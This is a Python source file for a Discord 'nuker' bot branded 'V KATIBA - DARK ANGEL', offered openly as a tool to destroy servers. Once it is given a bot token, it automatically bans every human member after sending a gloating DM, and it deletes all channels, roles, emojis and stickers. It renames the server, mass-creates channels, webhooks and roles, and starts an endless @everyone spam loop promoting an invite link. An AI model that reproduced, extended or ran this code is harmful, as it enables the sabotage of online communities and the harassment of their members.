import discord
from discord.ext import commands
import asyncio
import os
import random
import time
import aiohttp
import sys
import shutil
from datetime import datetime

# Clear screen
os.system('cls' if os.name == 'nt' else 'clear')

# ============================================
# BEAUTIFUL COLORS WITH EXTRA STYLES
# ============================================
class Colors:
    # Regular colors
    BLACK = '\033[30m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    
    # Bright colors
    BRIGHT_RED = '\033[91;1m'
    BRIGHT_GREEN = '\033[92;1m'
    BRIGHT_YELLOW = '\033[93;1m'
    BRIGHT_BLUE = '\033[94;1m'
    BRIGHT_MAGENTA = '\033[95;1m'
    BRIGHT_CYAN = '\033[96;1m'
    BRIGHT_WHITE = '\033[97;1m'
    
    # Background colors
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'
    BG_YELLOW = '\033[43m'
    BG_BLUE = '\033[44m'
    BG_MAGENTA = '\033[45m'
    BG_CYAN = '\033[46m'
    BG_BLACK = '\033[40m'
    
    # Styles
    BOLD = '\033[1m'
    DIM = '\033[2m'
    ITALIC = '\033[3m'
    UNDERLINE = '\033[4m'
    BLINK = '\033[5m'
    REVERSE = '\033[7m'
    HIDDEN = '\033[8m'
    RESET = '\033[0m'
    
    # Neon effects (using bright colors)
    NEON_RED = '\033[91;1m'
    NEON_GREEN = '\033[92;1m'
    NEON_YELLOW = '\033[93;1m'
    NEON_BLUE = '\033[94;1m'
    NEON_MAGENTA = '\033[95;1m'
    NEON_CYAN = '\033[96;1m'

# ============================================
# EXTRA BEAUTIFUL ANIMATED BANNER
# ============================================
def animate_demon_logo():
    frames = [
        f"""
{Colors.NEON_RED}╔═══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                                                                                       ║
║                         ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄     ║
║                        ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌    ║
║                        ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌    ║
║                        ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌    ║
║                        ▐░█▄▄▄▄▄▄▄█░▌▐░▌       ▐░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌    ║
║                        ▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌    ║
║                        ▐░█▀▀▀▀▀▀▀█░▌▐░▌       ▐░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀█░█▀▀     ║
║                        ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌     ▐░▌      ║
║                        ▐░▌       ▐░▌▐░█▄▄▄▄▄▄▄█░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌      ▐░▌     ║
║                        ▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌    ║
║                         ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀  ▀         ▀  ▀         ▀  ▀         ▀     ║
║                                                                                                                                                       ║
║                    ╔═══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗  ║
║                    ║                                                                                                                               ║  ║
║                    ║                    {Colors.NEON_RED}{Colors.BLINK}🔥🔥🔥  V KATIBA - DARK ANGEL EDITION  🔥🔥🔥{Colors.RESET}                                                   ║  ║
║                    ║                                                                                                                               ║  ║
║                    ║                    {Colors.NEON_MAGENTA}{Colors.BLINK}💀💀💀  فون لي يضربلك الطبون - القوة المطلقة  💀💀💀{Colors.RESET}                                           ║  ║
║                    ║                                                                                                                               ║  ║
║                    ║                    {Colors.NEON_CYAN}{Colors.BLINK}⚡⚡⚡  حنا الكتيبة مشي سراقين لي تولز - الأصليين  ⚡⚡⚡{Colors.RESET}                                             ║  ║
║                    ║                                                                                                                               ║  ║
║                    ║                    {Colors.NEON_YELLOW}{Colors.BLINK}🏆🏆🏆  اليد العليا - الجيل الجديد من التدمير  🏆🏆🏆{Colors.RESET}                                               ║  ║
║                    ║                                                                                                                               ║  ║
║                    ╚═══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝  ║
║                                                                                                                                                       ║
║                                   {Colors.NEON_CYAN}🔗🔗🔗  https://discord.gg/5RqpBkEg  🔗🔗🔗{Colors.RESET}                                                             ║
║                                                                                                                                                       ║
╚═══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}
"""
    ]
    
    for frame in frames:
        print(frame)
        time.sleep(0.1)

def login_screen():
    animate_demon_logo()
    print(f"\n{Colors.NEON_GREEN}{Colors.BOLD}[!] DISCORD ULTIMATE NUKER TOOL - V KATIBA DARK ANGEL{Colors.RESET}")
    print(f"{Colors.NEON_YELLOW}[!] POWER: +∞ | SPEED: LIGHT | DESTRUCTION: TOTAL{Colors.RESET}")
    print(f"{Colors.NEON_RED}[!] {Colors.BLINK}WARNING: THIS TOOL WILL COMPLETELY DESTROY ANY SERVER{Colors.RESET}\n")
    
    token = input(f"{Colors.NEON_CYAN}{Colors.BOLD}[?] ENTER BOT TOKEN: {Colors.RESET}")
    return token

# ============================================
# MAIN BOT CLASS
# ============================================
class VKatibaNuker:
    def __init__(self):
        self.token = None
        self.bot = None
        self.intents = None
        
    def setup_bot(self):
        self.intents = discord.Intents.all()
        self.intents.message_content = True
        self.intents.members = True
        self.intents.guilds = True
        self.intents.voice_states = True
        
        self.bot = commands.Bot(command_prefix="!", intents=self.intents)
        self.register_events()
        
    def register_events(self):
        @self.bot.event
        async def on_ready():
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"""
{Colors.NEON_GREEN}╔═══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                                                                               ║
║              ✅ V KATIBA - DARK ANGEL BOT ONLINE: {self.bot.user.name}{' ' * (35 - len(self.bot.user.name))}║
║              ✅ BOT ID: {self.bot.user.id}{' ' * (80 - len(str(self.bot.user.id)))}║
║              ✅ SERVERS FOUND: {len(self.bot.guilds)}{' ' * (79 - len(str(len(self.bot.guilds))))}║
║                                                                                                                                               ║
║              🚀🚀🚀 V KATIBA - AUTO-NUKE MODE ACTIVATED 🚀🚀🚀                                                                               ║
║              💪💪💪 WILL DESTROY ALL SERVERS IMMEDIATELY 💪💪💪                                                                               ║
║              🔗🔗🔗 https://discord.gg/5RqpBkEg 🔗🔗🔗                                                                                       ║
║                                                                                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}
            """)
            
            print(f"\n{Colors.NEON_RED}{Colors.BOLD}[!!!] AUTO-NUKE STARTING! DESTROYING {len(self.bot.guilds)} SERVERS...{Colors.RESET}\n")
            
            for guild in self.bot.guilds:
                await self.destroy_server(guild)
                await asyncio.sleep(2)
            
            print(f"\n{Colors.NEON_GREEN}{Colors.BOLD}[✓✓✓] ALL SERVERS DESTROYED!{Colors.RESET}")
            print(f"{Colors.NEON_YELLOW}[!] BOT WILL NOW STAY ONLINE FOR ANY NEW SERVERS{Colors.RESET}\n")
        
        @self.bot.event
        async def on_guild_join(guild):
            print(f"\n{Colors.NEON_YELLOW}[!] BOT ADDED TO NEW SERVER: {guild.name}{Colors.RESET}")
            print(f"{Colors.NEON_RED}[!!!] AUTO-NUKE ACTIVATED! DESTROYING SERVER...{Colors.RESET}")
            
            for channel in guild.text_channels:
                try:
                    await channel.send("```🔥🔥🔥 V KATIBA - AUTO-NUKE ACTIVATED 🔥🔥🔥```")
                    await channel.send("@everyone **💀💀💀 هذه نهاية سيرفركم 💀💀💀**")
                    break
                except:
                    pass
            
            await self.destroy_server(guild)
    
    async def destroy_server(self, guild):
        print(f"\n{Colors.NEON_MAGENTA}{'='*80}{Colors.RESET}")
        print(f"{Colors.NEON_RED}{Colors.BOLD}[!!!] V KATIBA - DESTROYING SERVER: {guild.name}{Colors.RESET}")
        print(f"{Colors.NEON_MAGENTA}{'='*80}{Colors.RESET}")
        
        start_time = time.time()
        
        first_channel = None
        for ch in guild.text_channels:
            first_channel = ch
            break
        
        if first_channel:
            try:
                await first_channel.send("```🔥🔥🔥 V KATIBA - ULTRA POWER NUKE ACTIVATED 🔥🔥🔥```")
                await first_channel.send("@everyone **💪💪💪 V KATIBA - فون لي يضربلك الطبون - قوة مليار مره 💪💪💪**")
            except:
                pass
        
        # BAN ALL MEMBERS
        print(f"{Colors.NEON_CYAN}[1/6] V KATIBA - BANNING ALL MEMBERS...{Colors.RESET}")
        
        members = []
        async for member in guild.fetch_members(limit=None):
            members.append(member)
        
        total_humans = len([m for m in members if not m.bot])
        banned = 0
        
        BAN_MESSAGE = f"""
{Colors.NEON_RED}╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║                         🏆🏆🏆 V KATIBA - DARK ANGEL 🏆🏆🏆                     ║
║                                                                               ║
║                    🔥🔥🔥 فون لي يضربلك الطبون 🔥🔥🔥                         ║
║                    💀💀💀 مينيطا خطيك ما دير لي تيم بسك 💀💀💀               ║
║                    ⚡⚡⚡ حنا الكتيبة مشي سراقين لي تولز ⚡⚡⚡                 ║
║                    💪💪💪 الكتيبة الأصليين - اليد العليا 💪💪💪               ║
║                                                                               ║
║                    🔗 انضم لسيرفرنا: https://discord.gg/5RqpBkEg 🔗          ║
║                                                                               ║
║                    ⭐ V KATIBA - V KATIBA - V KATIBA ⭐                       ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}
"""
        
        for member in members:
            if not member.bot:
                try:
                    await member.send(BAN_MESSAGE)
                    await asyncio.sleep(0.03)
                    await member.ban(reason="V KATIBA - DARK ANGEL", delete_message_days=7)
                    banned += 1
                    if banned % 20 == 0:
                        print(f"    • V KATIBA باند {banned}/{total_humans}")
                    await asyncio.sleep(0.005)
                except:
                    pass
        
        print(f"{Colors.NEON_GREEN}    ✓ BANNED {banned} MEMBERS{Colors.RESET}")
        
        # DELETE ALL CHANNELS
        print(f"{Colors.NEON_CYAN}[2/6] DELETING ALL CHANNELS...{Colors.RESET}")
        for ch in guild.channels:
            try:
                await ch.delete(reason="V KATIBA")
                await asyncio.sleep(0.005)
            except:
                pass
        
        # DELETE ALL ROLES
        print(f"{Colors.NEON_CYAN}[3/6] DELETING ALL ROLES...{Colors.RESET}")
        for role in guild.roles:
            if role.name != "@everyone":
                try:
                    await role.delete(reason="V KATIBA")
                    await asyncio.sleep(0.005)
                except:
                    pass
        
        # DELETE ALL EMOJIS
        print(f"{Colors.NEON_CYAN}[4/6] DELETING ALL EMOJIS & STICKERS...{Colors.RESET}")
        for emoji in guild.emojis:
            try:
                await emoji.delete()
                await asyncio.sleep(0.005)
            except:
                pass
        
        for sticker in guild.stickers:
            try:
                await sticker.delete()
                await asyncio.sleep(0.005)
            except:
                pass
        
        # CHANGE SERVER NAME
        new_name = random.choice(["V KATIBA", "🔥 V KATIBA 🔥", "V KATIBA - DARK ANGEL", "⚡ V KATIBA ⚡", "💀 V KATIBA 💀"])
        try:
            await guild.edit(name=new_name)
            print(f"{Colors.NEON_GREEN}    ✓ RENAMED TO: {new_name}{Colors.RESET}")
        except:
            pass
        
        # CREATE 1000 CHANNELS + WEBHOOKS + ROLES
        print(f"{Colors.NEON_CYAN}[5/6] CREATING 1000 CHANNELS + 1000 WEBHOOKS + 500 ROLES...{Colors.RESET}")
        
        channel_names = ["V-KATIBA", "DARK-ANGEL", "EL-YAD-EL-OLYA", "FON", "KATEBA-POWER"]
        webhook_names = ["V-KATIBA", "DARK-ANGEL", "KATEBA", "FON", "POWER"]
        
        webhooks = []
        for i in range(1000):
            try:
                new_ch = await guild.create_text_channel(name=f"{random.choice(channel_names)}-{i}")
                if i % 100 == 0 and i > 0:
                    print(f"    • CREATED {i} CHANNELS")
                try:
                    webhook = await new_ch.create_webhook(name=random.choice(webhook_names))
                    webhooks.append(webhook)
                except:
                    pass
                await asyncio.sleep(0.005)
            except:
                pass
        
        for i in range(500):
            try:
                await guild.create_role(name=f"V-KATIBA-{random.choice(webhook_names)}-{i}", color=discord.Color.red())
                if i % 100 == 0 and i > 0:
                    print(f"    • CREATED {i} ROLES")
                await asyncio.sleep(0.005)
            except:
                pass
        
        print(f"{Colors.NEON_GREEN}    ✓ CREATED CHANNELS, WEBHOOKS, AND ROLES{Colors.RESET}")
        
        # START INFINITE SPAM
        print(f"{Colors.NEON_CYAN}[6/6] STARTING INFINITE SPAM...{Colors.RESET}")
        
        spam_messages = [
            "@everyone **🔥🔥🔥 V KATIBA - DARK ANGEL DESTROYED THIS SERVER 🔥🔥🔥**",
            "@everyone **💀💀💀 فون لي يضربلك الطبون - القوة المطلقة 💀💀💀**",
            "@everyone **⚡⚡⚡ حنا الكتيبة مشي سراقين لي تولز ⚡⚡⚡**",
            "@everyone **🔗🔗🔗 https://discord.gg/5RqpBkEg 🔗🔗🔗**"
        ]
        
        async def spam():
            while True:
                for ch in guild.text_channels:
                    try:
                        await ch.send(random.choice(spam_messages))
                        await asyncio.sleep(0.01)
                    except:
                        pass
                await asyncio.sleep(0.05)
        
        asyncio.create_task(spam())
        
        end_time = time.time()
        total_time = round(end_time - start_time, 2)
        
        print(f"\n{Colors.NEON_MAGENTA}{'='*80}{Colors.RESET}")
        print(f"{Colors.NEON_GREEN}{Colors.BOLD}[✓✓✓] V KATIBA - SERVER DESTROYED!{Colors.RESET}")
        print(f"{Colors.NEON_GREEN}    • SERVER: {guild.name}")
        print(f"{Colors.NEON_GREEN}    • BANNED: {banned} MEMBERS")
        print(f"{Colors.NEON_GREEN}    • NEW NAME: {new_name}")
        print(f"{Colors.NEON_GREEN}    • CHANNELS: 1000 CREATED")
        print(f"{Colors.NEON_GREEN}    • WEBHOOKS: {len(webhooks)}")
        print(f"{Colors.NEON_GREEN}    • ROLES: 500 CREATED")
        print(f"{Colors.NEON_GREEN}    • TIME: {total_time} SECONDS")
        print(f"{Colors.NEON_MAGENTA}{'='*80}{Colors.RESET}\n")
        
        final_msg = f"""{Colors.NEON_RED}
╔═══════════════════════════════════════════════════════════════════════════╗
║                                                                           ║
║                    🏆🏆🏆 V KATIBA - DARK ANGEL 🏆🏆🏆                     ║
║                                                                           ║
║                         SERVER COMPLETELY DESTROYED                        ║
║                                                                           ║
║                    🔥 {banned} MEMBERS BANNED 🔥                          ║
║                    ⚡ {total_time} SECONDS ⚡                              ║
║                                                                           ║
║                    🔗 https://discord.gg/5RqpBkEg 🔗                      ║
║                                                                           ║
╚═══════════════════════════════════════════════════════════════════════════╝{Colors.RESET}"""
        
        for ch in guild.text_channels:
            try:
                await ch.send(final_msg)
                break
            except:
                pass
    
    def run(self):
        self.token = login_screen()
        self.setup_bot()
        print(f"\n{Colors.NEON_YELLOW}[!] Starting bot...{Colors.RESET}")
        self.bot.run(self.token)

# ============================================
# MAIN ENTRY POINT
# ============================================
def main():
    try:
        nuker = VKatibaNuker()
        nuker.run()
    except KeyboardInterrupt:
        print(f"\n{Colors.NEON_RED}[!] PROGRAM TERMINATED BY USER{Colors.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"{Colors.NEON_RED}[!] ERROR: {e}{Colors.RESET}")
        print(f"{Colors.NEON_YELLOW}[!] Make sure you enabled all Privileged Intents in Discord Developer Portal{Colors.RESET}")
        sys.exit(1)

if __name__ == "__main__":
    main()
